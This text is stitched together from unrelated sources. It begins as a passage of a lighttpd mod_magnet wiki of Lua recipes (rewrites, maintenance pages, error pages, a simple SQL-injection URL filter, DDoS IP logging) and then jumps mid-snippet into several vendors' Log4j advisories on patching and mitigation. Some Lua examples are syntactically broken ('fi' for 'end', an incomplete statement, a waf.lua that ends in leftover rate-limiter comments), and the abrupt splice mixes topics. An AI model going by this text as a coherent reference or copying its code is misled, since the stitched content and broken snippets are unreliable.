    request_uri = removePrefix(lighty.env["uri.path"], prefix)
    if request_uri then
      lighty.env["uri.path"]          = prefix .. "/index.php"
      local uriquery = lighty.env["uri.query"] or ""
      lighty.env["uri.query"] = uriquery .. (uriquery ~= "" and "&" or "") .. "q=" .. request_uri
      lighty.env["physical.rel-path"] = lighty.env["uri.path"]
      lighty.env["request.orig-uri"]  = lighty.env["request.uri"]
      lighty.env["physical.path"]     = lighty.env["physical.doc-root"] .. lighty.env["physical.rel-path"]
    end
end
-- fallthrough will put it back into the lighttpd request loop
-- that means we get the 304 handling for free. ;)

```

**Overwrite default mime-type/content-type**

Add "magnet.attract-physical-path-to = ( "/path-to/change-ctype.lua" )" to lighttpd.conf and save the following as "change-ctype.lua"
```

 if (string.match(lighty.env["physical.rel-path"], ".swf")) then
    lighty.header["Content-Type"] = "text/html"
 end

```

**Sending text-files as HTML**

This is a bit simplistic, but it illustrates the idea: Take a text-file and cover it in a "< pre >" tag.

Config-file

```

  magnet.attract-physical-path-to = (server.docroot + "/readme.lua")

```

readme.lua

```

  lighty.content = { "<pre>", { filename = "/README" }, "</pre>" }
  lighty.header["Content-Type"] = "text/html"

  return 200

```

**Redirect map**

[redirect-map.lua](https://redmine.lighttpd.net/attachments/2065) high performance redirect-map based on url-path

**Simple maintenance script**

You need three files, maint.up, maint.down and maint.html.
maint.html holds a simple html-page of what you want to display to your users while in maintenance-mode.

Add "magnet.attract-physical-path-to = ( "/path-to-your/maint.lua" )" to your lighttpd.conf, best is global section or within a host-section of your config, e.g. a board/forum/wiki you know a maintenance-mode is needed from time to time. If you want to switch to maintenance-mode, just copy maint.down to maint.lua in your "/path-to-your/" location, and lighttpd will display your maint.html to all users - without restarting anything - this can be done on-the-fly. Work is done and all is up again? Copy maint.up to maint.lua in your "/path-to-your/" location. Whats maint.up doing? Nothing, just going on with normal file serving :-)

maint.up - all is up, user will see normal pages

```

-- This is empty, nothing to do.

```

maint.down - lighttpd will show the maintenance page -> maint.html

```

-- lighty.header["X-Maintenance-Mode"] = "1"
-- uncomment the above if you want to add the header
lighty.content = { { filename = "/path-to-your/maint.html" } }
lighty.header["Content-Type"] = "text/html"
return 503
-- or return 200 if you want

```

**custom error pages**

mod\_magnet can be used to implement any or all of the lighttpd directives: `server.error-handler`, `server.error-handler-404`, `server.errorfile-prefix`, `server.error-intercept`

`magnet.attract-response-start-to = ( "/absolute/path/to/script.lua" )`
```

-- intercept all HTTP status errors (e.g. server.error-intercept = "enable")
local r = lighty.r
local http_status = r.req_item.http_status
if (http_status < 400) -- not an HTTP status error; do not modify
  return 0
end

-- send back custom error page (similar to server.errorfile-prefix)
-- replace existing response body, if any
local errfile = "/path/to/errfiles/" .. http_status .. ".html"
local st = lighty.c.stat(errfile)
if (not st) then
  errfile = "/path/to/errfiles/generic.html"
fi
r.resp_body:set({ { filename = errfile } })
-- (alternative: construct custom error page (similar to server.error-handler))

return http_status

```

**selecting a random file from a directory**

Say, you want to send a random file (ad-content) from a directory.

To simplify the code and to improve the performance we define:

* all images have the same format (e.g. image/png)
* all images use increasing numbers starting from 1
* a special index-file names the highest number

Config

```

  server.modules += ( "mod_magnet" )
  magnet.attract-physical-path-to = ("random.lua")

```

random.lua

```

  dir = lighty.env["physical.path"]

  f = assert(io.open(dir .. "/index", "r"))
  maxndx = f:read("*all")
  f:close()

  ndx = math.random(maxndx)

  lighty.content = { { filename = dir .. "/" .. ndx }}
  lighty.header["Content-Type"] = "image/png"

  return 200

```

**denying illegal character sequences in the URL**

Instead of implementing mod\_security, you might just want to apply filters on the content and deny special sequences that look like SQL injection.

A common injection is using UNION to extend a query with another SELECT query.

```

  if (string.find(lighty.env["request.uri"], "UNION%s")) then
    return 400
  end

```

**Traffic Quotas**

If you only allow your virtual hosts a certain amount for traffic each month and want to disable them if the traffic is reached, perhaps this helps:

```

  host_blacklist = { ["www.example.org"] = 0 }

  if (host_blacklist[lighty.request["Host"]]) then
    return 404
  end

```

Just add the hosts you want to blacklist into the blacklist table in the shown way.

**Complex rewrites**

If you want to implement caching on your document-root and only want to regenerate content if the requested file doesn't exist, you can attract the physical.path:

```

  magnet.attract-physical-path-to = ( server.document-root + "/rewrite.lua" )

```

rewrite.lua

```

  attr = lighty.stat(lighty.env["physical.path"])

  if (not attr) then
    -- we couldn't stat() the file for some reason
    -- let the backend generate it

    lighty.env["uri.path"] = "/dispatch.fcgi"
    lighty.env["physical.rel-path"] = lighty.env["uri.path"]
    lighty.env["physical.path"] = lighty.env["physical.doc-root"] .. lighty.env["physical.rel-path"]
  end

```

**Extension rewrites**

If you want to hide your file extensions (like .php) you can attract the physical.path:

```

  magnet.attract-physical-path-to = ( server.document-root + "/rewrite.lua" )

```

rewrite.lua

```

  attr = lighty.stat(lighty.env["physical.path"] .. ".php")

  if (attr) then
    lighty.env["uri.path"] = lighty.env["uri.path"] .. ".php"
    lighty.env["physical.rel-path"] = lighty.env["uri.path"]
    lighty.env["physical.path"] = lighty.env["physical.doc-root"] .. lighty.env["physical.rel-path"]
  end

```

**User tracking**

... or how to store data globally in the script-context:

Each script has its own script-context. When the script is started it only contains the lua-functions and the special lighty.\* name-space. If you want to save data between script runs, you can use the global-script context:

```

  if (nil == _G["usertrack"]) then
    _G["usertrack"] = {}
  end
  if (nil == _G["usertrack"][lighty.request["Cookie"]]) then
    _G["usertrack"][lighty.request["Cookie"]]
  else
    _G["usertrack"][lighty.request["Cookie"]] = _G["usertrack"][lighty.request["Cookie"]] + 1
  end

  print _G["usertrack"][lighty.request["Cookie"]]

```

The global-context is per script. If you update the script without restarting the server, the context will still be maintained.

**WordpressMU**

wpmu.lua

```

if (not lighty.stat(lighty.env["physical.path"])) then
  if (string.match(lighty.env["uri.path"], "^(/?[^/]*/)files/$")) then
    lighty.env["physical.rel-path"] = "index.php"
  else
    n, a = string.match(lighty.env["uri.path"], "^(/?[^/]*/)files/(.+)")
    if a then
      lighty.env["physical.rel-path"] = "wp-content/blogs.php"
      lighty.env["uri.query"] = "file=" .. a
    else
      n, a = string.match(lighty.env["uri.path"], "^(/[^/]*)/(wp-.*)")
      if a then
        lighty.env["physical.rel-path"] = a;
      else
        n, a = string.match(lighty.env["uri.path"], "^(/[^/]*)/(.*\.php)$")
        if a then
          lighty.env["physical.rel-path"] = a
        else
          lighty.env["physical.rel-path"] = "index.php"
        end
      end
    end
  end
  lighty.env["physical.path"] = lighty.env["physical.doc-root"] .. "/".. lighty.env["physical.rel-path"]
end

```
# Content Negotiation[¶](#Content-Negotiation)

# Fight DDoS[¶](#Fight-DDoS)

If your Server is under high load because of someone is flooding you with requests, a little bit lua might help you. ;) In our case we've got a lot of requests without a User-Agent in the request header.
```
if ( lighty.request["User-Agent"]== nil ) then
        file = io.open ("ips.txt","a")
        file:write(lighty.env["request.remote-ip"])
        file:write("\n")
        file:close()
        return 200
end
```

The field request.remote-ip is available since lighttpd 1.4.23. The file ips.txt must be writeable by the lighttpd user (www-data). The bad guys in the ips.txt file can be dropped into the firewall with a little shell script.

lua can also be used to access a database and reject requests based on data in the database.
See sample [reject-bad-actors.lua](https://redmine.lighttpd.net/attachments/2064) attached in Files section at the bottom of this page. It uses an mcdb constant database for fast lookups.

# Mod\_Security[¶](#Mod_Security)

Apache has mod\_security available as a WAF (web application firewall) however this isn't available for other webservers. I've written a quick and dirty script to perform a similar task to mod\_security using mod\_magnet
[lighttpd-mod\_security-via-mod\_magnet](https://web.archive.org/web/20160311005141/http%3A//whmcr.com/2009/06/19/lighttpd-mod_security-via-mod_magnet)

I've been recently working on libmodsecurity binding for openresty which is a nginx+luajit combo. Using patched [libmodsecurity](https://github.com/pr4u4t/ModSecurity) and [cffi-lua](https://github.com/q66/cffi-lua) along with [modsec.lua](https://luarocks.org/modules/pr4u4t/modsec) and mod\_magnet lighttpd can perform incoming request inspection. Currently there is no way to perform request body (POST) and response inspection. Two last would involve additional lua entry points in lighty. Security rules could be obtained at [coreruleset](https://github.com/coreruleset/coreruleset).

waf.lua for lighttpd:
```

local modsec = require "modsec"

local ok, err = modsec.init("/etc/owasp/modsec.conf")
if not ok then
        print(err)
        return
end

local transaction = modsec.transaction()

if not transaction then
        print("Failed to initialize transaction")
end

-- evaluate connection info and request headers
local req_attr = lighty.r.req_attr
local url = req_attr["uri.scheme"]
         .. "://"
         .. req_attr["uri.authority"]
         .. req_attr["uri.path-raw"]
         .. (req_attr["uri.query"] and ("?" .. req_attr["uri.query"]) or "")

local res, err = transaction:eval_connection(req_attr["request.remote-addr"],req_attr["request.remote-port"],
                                                req_attr["uri.authority"],req_attr["request.server-port"],url,
                                                req_attr["request.method"],req_attr["request.protocol"])

if err then
        print("Failed to evaluate connection: ",err)
end

local res, err = transaction:eval_request_headers(lighty.r.req_header)

if err then
        print("Failed to evaluate request headers: ",err)
end

--[[ evaluate request body
Currently no way to evaluate request body
but this function must be run even with nil as arguments
]]

local res, err = transaction:eval_request_body(nil,nil)

if err then
        print("Failed to evaluate request body: ",err)
end

-- Here decision could be made upon modsecurity variables whether handle this request or not
local score = tonumber(transaction.var.tx.anomaly_score)

if score >= 8 then
        print("This request looks nasty overall score is: "..score)
        return 403
end

  -- Alternatives:
  -- could set Location response header to alternate site and send 302 redirect
  -- could rewrite the request to a static page for /site-busy.html
  --   (and be sure to also disable caching, e.g. Cache-Control: max-age=0)
  -- could reject requests with 403 Forbidden
end

-- Limitations:
--
-- The above lua scans all active requests for matching remote address, but only
-- sees the current lighttpd process.  This may miss requests when there are
-- multiple lighttpd workers or independent servers.
--
-- For high-traffic sites, a more efficient solution may be to implement
-- the request rate limiter in the backend daemon servicing the requests.
-- Requests can be accepted and entered into backend queue up to a limit before
-- turning away new requests.  A fixed number of threads can service the queue.

# other solutions[¶](#other-solutions)

**external-static**

I´ve seen this nice solution somewhere where they host some files locally on their machines. If popularity gets to high, files are too big or for whatever reasons the files are moved to i think it was amazon´s S3 or akamai for faster serving or to cope with high traffic. You still can use your hostname, urls, collect stats from your logs - your users are just redirected with a 302 to the files they ask for.

2008-11-17: Found the source: [presto-move-content-to-s3-with-no-code-changes](https://web.archive.org/web/20120817090808/http%3A//www.innerfence.com/blog/2008/05/31/presto-move-content-to-s3-with-no-code-changes/)

```
Request -> check for local copy -> 302 (if not stored locally) -> let users download from a big pipe
```

Add the following to your lighttpd.conf:
```

```

Save the following to external-static.lua:
```

 local filename = lighty.env["physical.path"]
 local stat = lighty.stat( filename )
 if not stat then
   local static_name = string.match( filename, "static/([^/]+)$" )
   lighty.header["Location"] = "http://<new-location-with-big-pipes>/" .. static_name

**Advisory ID:** NTAP-20211215-0001
**Version:**
27.0

**Last updated:**
06/21/2022

**Status:**
Final.

**CVEs:** CVE-2021-45046

Overview
#### Summary

Multiple NetApp products incorporate Apache Log4j. It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. Certain Apache Log4j versions prior to 2.16.0 are susceptible to a vulnerability which when successfully exploited could allow attackers with control over Thread Context Map (MDC) input data to craft malicious input data using a JNDI Lookup pattern resulting in an information leak and remote code execution in some environments and local code execution in all environments.

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

NetApp SolidFire, Enterprise SDS & HCI Storage Node (Element Software) is affected only when the âVirtual Volumes (vVols)â feature is enabled on the cluster.

#### Vulnerability Scoring Details

#### CUDA Toolkit Visual Profiler and Nsight Eclipse Edition

| CVE IDs Addressed | **Product Name** | **Affected Versions** | **Updated Version** | **Mitigation for Affected Versions** |
| --- | --- | --- | --- | --- |
| CVE‑2021‑44228 CVE‑2021‑45046 CVE‑2021‑41505 | CUDA Toolkit Visual Profiler | Visual Profiler in CUDA Toolkit version 11.5 and prior versions | CUDA Toolkit version 11.6.0 CUDA Toolkit updates 11.5.2 and 11.4.4 will be available in February 2022. | Log4j is included in CUDA Toolkit. However it is not being used and there is no risk to users who have the Log4j files. Because they are not being used, an update is being prepared to remove the Log4j files[1] from CUDA Toolkit. If concerned, customers can safely delete the files as a mitigation. |
| CUDA Toolkit Nsight Eclipse Edition | Nsight Eclipse Edition in CUDA Toolkit prior to version 11.0 | Nsight Eclipse Plugins Edition in CUDA Toolkit version 11.0 or later Updates for version 10.2 will be available in February 2022. | Update to an Nsight Eclipse Plugins Edition  in CUDA Toolkit version 11.0 or later Alternatively, note that Log4j is included in CUDA Toolkit 10.2 and earlier. However it is not being used and there is no risk to users who have the Log4j files. Because they are not being used, an update is being prepared to remove the Log4j files[2] from CUDA Toolkit 10.2 updates. If concerned, customers can safely delete the files as a mitigation. |

[1] For example: `C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.5\libnvvp\plugins\org.apache.ant_1.9.2.v201404171502\lib\ant-apache-log4j.jar`

[2] For example: `/usr/local/cuda/libnsight/plugins/org.apache.ant_1.9.2.v201404171502/lib/ant-apache-log4j.jar`

#### DGX Systems

By default, DGX systems are not exposed to this issue. NVIDIA did not include the Log4j Java library in its DGX OS releases, but this library might have been installed by a user as additional software. To check if a version of the `liblog4j2-java` library built from a vulnerable `apache-log4j2` source package is installed on your system, run the following command:

```

$ apt-cache policy liblog4j2-java
liblog4j2-java:
  Installed: (none)
  Candidate: 2.10.0-2ubuntu0.1
```

Fixes to address this issue are available from Canonical in the updated versions listed in the following table.

If a version of the `liblog4j2-java` library built from a vulnerable `apache-log4j2` source package is installed, run the following commands to get the updated version:

```

$ sudo apt update
$ sudo apt full-upgrade
```

# Graylog Update for Log4j

* [December 21, 2021](https://graylog.org/post/2021/12/21/)
* [The Graylog Product Team](https://graylog.org/post/author/the-graylog-product-teamgraylog-org/)

![](https://graylog.org/wp-content/uploads/2022/07/61b3a84018038b2fe412fc9c_Graylog-Release-Graphic.png)

### UPDATED 12/20/21

Quick update to say that Graylog (and elastic), in their default configuration, are not vulnerable to the dos issue that was addressed in the [Log4j 2.17.0](https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0) release on 12/19/21. No mitigating actions are necessary.

### UPDATED 12/16/21

Graylog has just issued new releases for versions 3.3.x – 4.2.x. These releases include an update to Log4j v2.16.0 to fix an additional security issue in Log4j that Apache [disclosed to the public](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046) on December 14.

Once again, the Graylog development team immediately incorporated this fix into all supported versions of the platform as well as the Graylog Forwarder (v3.3.16, v4.0.15, v4.1.10, and v4.2.4). We recommend that all Graylog customers immediately upgrade to the appropriate version. We have also updated Graylog Cloud.

### IMPORTANT  – PLEASE READ

Because all versions of Graylog do not support Elasticsearch versions higher that 7.10.x, to mitigate the risk of vulnerability, you need to manually edit the jvm.options.d file. For instructions on how to do this, please refer to the steps in Elastic’s [Setting JVM Options](https://www.elastic.co/guide/en/elasticsearch/reference/7.10/jvm-options.html) chapter. You can also find more detailed information on how to upgrade your platform and forwarder in the [Graylog documentation](https://docs.graylog.org/docs/upgrade-graylog-against-log4shell).

The links below will take you to the Graylog updates for all supported versions of Graylog.

* [V3.3.16](https://graylog.org/post/announcing-graylog-v3-3-16)
* [V4.0.15](https://graylog.org/post/announcing-graylog-v4-0-15)
* [V4.1.10](https://graylog.org/post/announcing-graylog-v4-1-10)
* [V4.2.4](https://graylog.org/post/announcing-graylog-v4-2-4)

#### GRAYLOG FORWARDER

Tarball (manual installation):

* [Graylog Forwarder](https://downloads.graylog.org/releases/cloud/forwarder/4.6/graylog-forwarder-4.6-bin.tar.gz)

OS Packages

* [DEB Package](https://downloads.graylog.org/releases/cloud/forwarder/4.6/graylog-forwarder_4.6-1_all.deb)
* [RPM Package](https://downloads.graylog.org/releases/cloud/forwarder/4.6/graylog-forwarder-4.6-1.noarch.rpm)

### POSTED 12/10/21

A zero-day vulnerability impacting version 2.0 <= 2.14.1 of the Apache Log4j 2 package was disclosed to the public on December 9.

Graylog uses the Log4j 2 Java library to record its own log information. Versions of this library earlier than 2.15.0 are vulnerable to a remote code execution attack, specifically when specially crafted values sent as user input will be logged by Graylog. For more details on the vulnerability, please refer to the [CVE](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

Apache has released a new Log4j to fix the vulnerability and the Graylog development team immediately incorporated this fix into all supported versions of the platform (v3.3.15, v4.0.14, v4.1.9, and v4.2.3).

The links below will take you to the Graylog updates for all supported versions of Graylog.

* [V3.3.15](https://graylog.org/post/announcing-graylog-v3-3-15)
* [V4.0.14](https://graylog.org/post/announcing-graylog-v4-0-14)
* [V4.1.9](https://graylog.org/post/announcing-graylog-v4-1-9)
* [V4.2.3](https://graylog.org/post/announcing-graylog-v4-2-3)

We recommend that all Graylog customers immediately upgrade to the appropriate version. We have also updated Graylog Cloud.

### AFFECTED GRAYLOG VERSIONS

All versions >= 1.2.0 and <= 4.2.2.

### IF YOU ARE UNABLE TO UPGRADE/YOU ARE RUNNING A VERSION EARLIER THAN 3.3

Suppose you can’t update your Graylog platform immediately or run an unsupported version of Graylog. In that case, you can mitigate the zero-day exploit by applying a change to the Graylog startup configuration.

The -Dlog4j2.formatMsgNoLookups=true Java system property can be configured to disable the vulnerable feature of the Log4j 2 library.

## UPGRADING GRAYLOG

### OPERATING SYSTEM PACKAGES

If you install Graylog via operating system packages, you need to update to the following package versions.

* 3.3.14-2
* 4.0.13-2
* 4.1.8-2
* 4.2.2-2

The packages still use the affected Log4j 2 library version but the -Dlog4j2.formatMsgNoLookups=true configuration setting has been applied to the default configuration.

If you do not use the default configuration of the operating system packages, you need to add the -Dlog4j2.formatMsgNoLookups=true system property to the GRAYLOG\_SERVER\_JAVA\_OPTS variable in following files.

* DEB: /etc/default/graylog-server
* RPM: /etc/sysconfig/graylog-server

## DOCKER CONTAINERS

**NOTE: As of 12/16/21, if you are upgrading to the latest versions (3.3.16, 4.0.15, 4.1.10, 4.2.4) you no longer need to do anything with your Docker compose file.**

If you can’t update your Docker containers to one of the fixed versions, your next step depends on whether or not you’ve configured your container.

If you HAVE configured your Docker Container, you will need to *change* the GRAYLOG\_SERVER\_JAVA\_OPTS environment variable.

If you HAVE NOT configured your Docker Container, you will need to *use* the GRAYLOG\_SERVER\_JAVA\_OPTS environment variable.

Example:

docker run -e GRAYLOG\_SERVER\_JAVA\_OPTS=”-Dlog4j2.formatMsgNoLookups=true” graylog/graylog:4.2

## GRAYLOG AND MONGODB

Regarding Elasticsearch and MongoDB–Graylog does not maintain these platforms, these are not maintained by Graylog we can advise that Elasticsearch and MongoDB have published advice as follows –

7.10

### MONGODB

The good news is that MongoDB is not affected by the Log4j 2 vulnerability.

For more detail, click [here](https://www.mongodb.com/blog/post/log4shell-vulnerability-cve-2021-44228-and-mongodb).

### ELASTICSEARCH

Elasticsearch versions 5.0.0+ contain a vulnerable version of Log4j. We’ve confirmed that the Security Manager mitigates the remote code execution attack in Elasticsearch 6 and 7; investigation is still underway for Elasticsearch 5.

For more detail, click [here](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476).

### SOLUTIONS AND MITIGATIONS

Set the[JVM option 1.3k](https://www.elastic.co/guide/en/elasticsearch/reference/7.16/advanced-configuration.html#set-jvm-options) -Dlog4j2.formatMsgNoLookups=true

For instructions on setting JVM configuration, see [Elastic Advanced Configuration Guide](https://www.elastic.co/guide/en/elasticsearch/reference/7.16/advanced-configuration.html#set-jvm-options).

## Overview

On Thursday December 9, 2021, a severe remote code vulnerability was revealed in Apache’s Log4J , a very common logging system used by developers of web and server applications based on Java and other programming languages. The vulnerability affects a broad range of services and applications on servers, making it extremely dangerous—and the latest updates for those server applications urgent. Sophos has observed widespread malicious attempts to exploit internet facing services using this vulnerability.

The vulnerability makes it possible for any attacker who can inject text into log messages or log message parameters into server logs that load code from a remote server; The targeted server will then execute that code via calls to the Java Naming and Directory Interface (JNDI). JNDI interfaces with a number of network services, including the Lightweight Directory Access Protocol (LDAP), Domain Name Service (DNS), Java’s Remote Interface (RMI), and the Common Object Request Broker (CORBA). Sophos has seen efforts to exploit LDAP, DNS and RMI, using a URL tagged to those services redirected to an external server.

## Patches for Log4j

While there are steps that customers can take to mitigate the vulnerability, the best fix is to upgrade to the patched version, already released by Apache in Log4j 2.15.0.

Additional Log4j bugs, CVE-2021-45046 and CVE-2021-45015, have caused Apache to update Log4j from 2.15.0 to the version 2.17.0. A fourth CVE, CVE-2021-44832, was reported just after the Christmas 2021 weekend, on 2021-12-28, causing Apache to update Log4j to version 2.17.1. Sophos recommends you update to Log4j 2.17.1.

If you have already started patching with version 2.15.0 but haven't completed the update on all systems, our recommendation is to finish patching any remaining systems with 2.17.1. This ensures all systems will have a minimum version of at least 2.15.0 which addresses the critical CVE-2021-44228 vulnerability, and then you can then go back and upgrade those systems to 2.17.1 so that you have the same version everywhere.

### Sophos XDR customers

Sophos XDR customers can use Sophos LiveQuery to help identify vulnerable Log4j components in their environment.

Example queries are maintained on the Sophos Community forum:

* Identify vulnerable Log4j Apache components (Linux only) <https://community.sophos.com/intercept-x-endpoint/i/compliance/identify-vulnerable-log4j-apache-components>
* Basic search to find Log4J running on hosts from the Sophos DataLake (Windows / macOS / Linux) : <https://community.sophos.com/intercept-x-endpoint/i/compliance/basic-search-to-find-log4j-running-on-hosts-from-xdr>

If you identify the vulnerable component, you should update immediately and review your logs for any signs of exploitation attempts. Sophos expects that a successful exploitation will not be logged by Log4j itself, requiring correlation with other log sources.

### Malicious Payload Detections

SophosLabs has published detections for the malicious payloads coming via Log4shell. The detection are predominantly for crypto miners, attack scripts and malicious java downloaders. Please note that not all of these payloads are exclusive to Log4Shell and may be arriving via another vector.

4. Puppet and Log4j Remote Code Execution Vulnerabilities
December 10, 2021
# Puppet and Log4j Remote Code Execution Vulnerabilities

Security & ComplianceHow to & Use Cases

By
[Sarah Hullender](#authorsarahhullender)
and
[Diego Lapiduz](#authordiegolapiduz)

Log4j is a Java-based logging framework that is used in many applications and is prone to remote code execution (RCE) vulnerabilities, which have become increasingly common and impacted many companies. It is essential to be aware of these vulnerabilities and take appropriate measures to protect against them.

Puppet IT automation tools are designed to simplify the process of managing large-scale infrastructure and quickly identify and address security and compliance issues, which includes [Log4j vulnerability mitigation](https://www.puppet.com/blog/log4j-vulnerability-mitigation).

To ensure all Puppet users have the best possible protection from Log4j vulnerabilities, the Puppet team has taken some proactive steps to address them. This includes regularly reviewing and updating the Log4j library used in Puppet, providing users with guidance on minimizing the risk of Log4j vulnerabilities, and releasing a [Puppet Enterprise Log4j module](https://forge.puppet.com/modules/puppetlabs/log4jscanner) to help users monitor and audit their Log4j configurations. The Puppet team is also actively engaged in the open-source community to ensure that any new or emerging Log4j vulnerabilities are addressed quickly and efficiently.

This article covers the impact of Log4j remote code execution vulnerabilities on Puppet products, what security measures our team has taken against them, and what you should do now to protect your systems.

## Puppet and Log4j Vulnerabilities: The Latest Updates

**January 21, 2022 Update:** On January 20, 2022, Puppet released Puppet Comply version 2.2.2, updating the Log4j library to 2.17.0.

**December 29, 2021 Update:***On December 28, a new vulnerability was identified in Log4j through versions 2.17.0. This is identified as CVE-2021-44832. Puppet has determined that none of our products are vulnerable to being exploited by this issue. The Log4j configuration in our product cannot be modified by users which is a requirement for this vulnerability to be exploited. Puppet will include an update to Log4j as part of the regular release cadence.*

**December 20, 2021 Update:***On December 20, in response to a new Log4j vulnerability* [*CVE-2021-45105*](https://nvd.nist.gov/vuln/detail/CVE-2021-45105)*, we released Continuous Delivery for* [*Puppet Enterprise version 4.10.5*](/docs/continuous-delivery/4.x/cd_release_notes.html#cd_release_notes-version-4-10-5) *with Apache Log4j 2.17.0.*

**December 17, 2021 Update:***The severity of* [*CVE-2021-45046*](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)*, the fix to address* [*CVE-2021-44228*](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) *in Apache Log4j 2.15.0, has been changed from medium to critical. In response, we have released Continuous Delivery for Puppet Enterprise (CD for PE) version 4.10.4 with Apache Log4j 2.16.0. We still do not believe that CD for PE is vulnerable given the Log4j configuration and mitigation, but want to provide our users with the most up-to-date software possible as the situation evolves.*

*If you are a Continuous Delivery for PE customer running version 3.x, we emphasize this version is not eligible for Puppet-delivered remediation. Our guidance continues to be to upgrade to version 4.x. If you continue to use 3.x, the mitigation steps provided may help. We strongly suggest you actively monitor your servers.*

**December 16, 2021 Update:***The content of this blog was updated on December 16th to acknowledge that the pattern matching layout in Continuous Delivery for Puppet Enterprise (CD for PE) 4.10.3 does not use a Context Lookup or Thread Context Map Pattern described in CVE-2021-45046. As such, this CVE is currently not exploitable in the latest release of CD for PE, version 4.10.3. We are actively working on our next release of CD for PE which will include Apache log4j 2.16.0 and will be released as soon as safely possible.*

**December 15, 2021 Update:***The content of this blog was updated on December 15th to acknowledge that Puppet Comply may also be vulnerable to CVE-2021-44228 due to a third-party component that provides key functionality to the product. Puppet Comply does not use Log4j directly. Further details below.*

## Puppet and Log4j Vulnerabilities: What's the Impact?

> Puppet Enterprise, Puppetserver, and Puppet agents have not been impacted by the Log4j RCE vulnerabilities. Continuous Delivery for Puppet Enterprise (CD for PE), however, has been impacted by CVE-2021-44228.

A [release update](https://puppet.com/docs/continuous-delivery/4.x/cd_release_notes.html#cd_release_notes-version-4-10-5) and mitigation steps for Continuous Delivery for Puppet Enterprise version 4.x, is now available. Partial mitigation steps for Continuous Delivery for Puppet Enterprise version 3.x, which reached [end of life](https://portal.perforce.com/s/article/360053586314) earlier this year, can be found in the FAQ. For Continuous Delivery for PE customers running version 3.x, our guidance continues to be to upgrade to version 4.x. If you continue to use 3.x, the mitigation steps provided may help. We strongly suggest you actively monitor your servers.

An [FAQ](https://support.puppet.com/hc/en-us/articles/4415592831511) outlining the path forward for CD for PE customers on versions 3.x and 4.x is available.

## How Has Puppet Comply Been Impacted By Log4j Vulnerabilities?

> Puppet was alerted that a third-party component that provides key functionality to Puppet Comply was impacted. The Puppet Comply server is not vulnerable and Puppet Comply does not use Log4j directly. Only the Puppet Comply third-party assessor uses the vulnerable package but given its limited scope, the potential for exploitation is reduced.

On January 20, [Puppet released Comply v. 2.2.2](/docs/comply/2.x/comply-release-notes.html) which addresses all known vulnerabilities that can potentially be exploited in the product.

# A Statement on Log4shell (CVE-2021-44228)

[Previous](/our-blog/4medica-smile-partnership)

[Next](/our-blog/drummond-group-certification)

On Thursday, Dec 9, 2021, a very serious security vulnerability was reported against a widely used Java logging framework called Log4j2. This vulnerability affects many popular software packages, and potentially allows remote code execution, making it extremely serious. You can learn more about this [here](https://arstechnica.com/information-technology/2021/12/minecraft-and-other-apps-face-serious-threat-from-new-code-execution-bug/).

It is important to stress that Smile CDR and HAPI FHIR both use a competing framework called [Logback](http://logback.qos.ch/) for logging functions, and this framework is not vulnerable to this issue. Our use of the Logback framework is described [here](https://smilecdr.com/docs/logging/system_logging.html).

Smile CDR does include a library in our standard distribution that appears to be vulnerable (log4j-api-2.11.1). An audit reveals that this library is included for compatibility reasons only and is not used for any primary logging, meaning that it should not pose any risk.

Because Smile CDR allows customer code to be added at deploy-time (via our interceptor mechanism) there is a chance that customer code may have chosen to use the log4j2 framework for logging. Customers are recommended to audit any code they have added to Smile CDR to ensure that it is not using log4j2.

##### Additional Technical Detail (Added 2021-12-13)

We have had a number of inquiries requesting additional detail about why the log4j library is included in our distribution. The following is a more detailed technical explanation of the results of our audit. Note that this explanation applies to both Smile CDR as well as the HAPI FHIR JPAServer Starter Project and any other project derived from the hapi-fhir-jpaserver-base module.

Smile CDR and HAPI FHIR use two complementary logging systems (SLF4J and Logback) for all of our system logging. These libraries are completely separate from log4j (the target of the CVE) and are not affected by this vulnerability.

We do include a part of the log4j library in our distribution, specifically a library called “log4j-api”. This library is included for compatibility with the database framework we use (Hibernate). Hibernate does use log4j, and we include a “bridge” that ensures Hibernate’s logs end up in the same files as the rest of the Smile CDR/HAPI FHIR logs.

Hibernate does not log any client-supplied messages, however, and logging specially crafted strings is the only way that CVE-2021-44228 can be exploited. Any user-supplied strings (e.g. FHIR resource contents, URL parameters, etc.) are always logged using SLF4j, meaning that even though log4j is present, it can not be exploited as it is only used to log fixed internal messages.

We will be updating the log4j library version in the next releases of Smile CDR and HAPI FHIR in order to avoid false-positive results from scanners, but at this time we do not believe there is any risk in using the current version of the products.

##### Update (Added 2022-01-07)

Since this original post was authored, several new vulnerabilities have been discovered in the Log4j library. These are numbered CVE-2021-44832, CVE-2021-45105, and CVE-2021-45046.

While these issues are not as severe as the original issue (CVE-2021-44228), they are still potentially serious and have generated a lot of concern.

It is important to stress that Smile CDR is not vulnerable to these issues either, for the same reason: We include a Log4j API library (log4j-api) in our distribution for compatibility reasons, but we do not include the Log4j Core library (log4j-core), and it is the latter library where these vulnerabilities are found.

Despite this, we have had requests from some customers to produce a build of Smile CDR that does not include the Log4j API library with a version number matching the vulnerable Log4j Core library. As a result, we have released Smile CDR 2021.11.R03. This new build is available immediately.

To be clear: There is no vulnerability in previous versions of Smile CDR, and there is no requirement to upgrade. However, if you have scanning tools that are producing false positives, it may be helpful to upgrade to avoid this.

As always, we are happy to discuss this if you have any further concerns and remain vigilant about any vulnerabilities discovered in our software and libraries.

**Update as of December 29, 2021:**

On December 28, 2021, Apache disclosed a new vulnerability (CVE-2021-44832). This is a medium severity vulnerability (CVSS score: 6.6) that allows for remote code execution (RCE) in Apache Log4j2 versions 2.0-beta7 through 2.17.0, excluding security fix releases 2.3.2 and 2.12.4. Apache released Log4j2 versions 2.17.1, 2.12.4, and 2.3.2 to patch the vulnerability and resolve the issue.

For the latest information on how to update your Forescout products, please refer to [KB Article #12049](https://forescout.force.com/support/s/article/Important-security-information-related-to-Apache-Log4j-utility-CVE-2021-44228) on our portal.

For more information: Apache CVE: [CVE-2021-44832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832)

